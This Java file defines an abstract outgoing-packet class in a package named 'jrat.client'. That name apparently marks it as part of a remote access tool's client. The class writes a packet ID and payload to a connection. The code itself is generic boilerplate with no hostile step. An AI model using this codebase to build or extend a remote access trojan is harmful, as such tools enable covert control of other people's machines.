package jrat.client.packets.outgoing;

import jrat.client.Connection;


public abstract class AbstractOutgoingPacket {

	public abstract void write(Connection dos) throws Exception;

	public abstract short getPacketId();

	public synchronized final void send(Connection dos) {
		try {
			dos.writeShort(getPacketId());
			this.write(dos);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

}
